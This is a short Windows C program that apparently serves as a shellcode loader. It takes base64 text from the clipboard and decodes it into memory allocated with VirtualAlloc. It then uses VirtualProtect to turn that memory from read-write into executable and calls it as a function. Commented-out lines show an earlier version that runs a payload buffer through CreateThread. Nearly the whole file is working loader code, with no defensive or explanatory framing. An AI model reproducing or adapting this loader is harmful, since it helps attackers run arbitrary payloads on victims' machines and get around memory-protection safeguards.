#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

int main() {
	printf("Is clipboard open or not: %d\n", OpenClipboard(NULL));
	printf("Handle of clipboard owner: %x\n", (char*)GetClipboardOwner());
	DWORD size;
	//LPVOID payload = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//memcpy(payload, buf, sizeof(buf));
	//HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)payload, 0, 0, 0);
	//WaitForSingleObject(th, -1);
	if (CryptStringToBinaryA((char*)GetClipboardData(CF_TEXT), 0, CRYPT_STRING_BASE64, NULL, &size, 0, 0) == 0) { printf("Couldnt CryptStringToBinaryA\nQuitting..."); }
	else {
		LPVOID payload = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
		if (payload == NULL) {
			printf("VirtualAlloc failed with error code %d", GetLastError());
		}
		//char payload[100];
		CryptStringToBinaryA((char*)GetClipboardData(CF_TEXT), 0, CRYPT_STRING_BASE64, (BYTE *)payload, &size, 0, 0);
		//char* test = (char*)payload;
		printf("%lx with size %d", (*(int *)payload), size);
		if (VirtualProtect(payload, size, PAGE_EXECUTE_READ, &size) == 0) { printf("Cant convert RW to RX with error code %d", GetLastError()); exit(-1); }
		((void(*)())payload)();
	}
	CloseClipboard();
	return 0;
}
